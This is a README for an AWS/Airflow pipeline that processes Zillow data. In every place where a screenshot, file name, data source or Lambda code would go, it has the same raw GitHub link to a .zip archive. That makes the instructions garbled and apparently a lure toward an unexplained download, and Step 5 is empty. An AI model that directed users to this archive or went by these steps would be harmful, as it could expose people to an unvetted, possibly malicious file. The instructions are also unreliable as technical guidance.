# Zillow Data Pipeline 🏡

![Zillow Data Pipeline Project](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip)

![Screenshot 1](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip)
![Screenshot 2](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip)

---

## Step-by-Step Guide to Set Up Your Zillow Data Pipeline 🛠️

### Step 1: Set Up Your Environment 🌐
1. **Update your system**:
    ```bash
    sudo apt update
    ```

2. **Install necessary packages**:
    ```bash
    sudo apt install python3-pip
    sudo apt install python3.10-venv
    ```

3. **Create a virtual environment**:
    ```bash
    python3 -m venv endtoendyoutube_venv
    ```

4. **Activate the virtual environment**:
    ```bash
    source endtoendyoutube_venv/bin/activate
    ```

5. **Install AWS CLI**:
    ```bash
    pip install --upgrade awscli
    ```

6. **Install Apache Airflow**:
    ```bash
    sudo pip install apache-airflow
    airflow standalone
    ```

7. **Install Amazon provider for Airflow**:
    ```bash
    pip install apache-airflow-providers-amazon
    ```

---

### Step 2: Connect VSCode with EC2 and Create DAG 🖥️
1. **Connect to your EC2 instance using VSCode**.
2. **Create a file inside the Airflow directory**:
   - Name the file `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip`.
3. **Write the code for `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip`**:
   - Define the tasks you will create.

#### Task 1: Extract Zillow Data 📊
- **Function**: `extract_zillow_data_var`
- **Description**: Import dummy data from `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip`, create a `raw_data` folder, and dump the raw data into that folder.

#### Task 2: Upload Data to S3 ☁️
- **Function**: `upload_to_s3`
- **Description**: Dump data from the EC2 local file to the `s3_raw_data` bucket.

---

### Step 3: Set Up AWS Lambda for S3 Triggers 🧙‍♂️
1. **Create a Lambda function**.
2. **Create a trigger**:  
   - Set it to activate on `put object` events in the `s3_raw_data` bucket.
3. **Implement the Lambda function**:
   - Write the script for `s3_to_s3` in the Lambda function to dump data into the `s3_staging_data` bucket.

---

### Step 4: Transform Data with Another Lambda Function 🔄
1. **Create another Lambda function**.
2. **Create a trigger**:  
   - Set it to activate on `put object` events in the `s3_staging_data` bucket.
3. **Implement the Lambda function**:
   - Paste the code from `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip` in the Lambda function to dump data into the `s3_transformed_data` bucket.

---

### Step 5:  Further Visualize It  📊

---



By following these steps, you will successfully set up a data pipeline that extracts, processes, and transforms Zillow data using AWS services! 🎉




step 5: crated a airflow task transfer_s3_to_redshift which will dump data to redhift 



step 6 connect the redshift database with quiksight and visualize it 
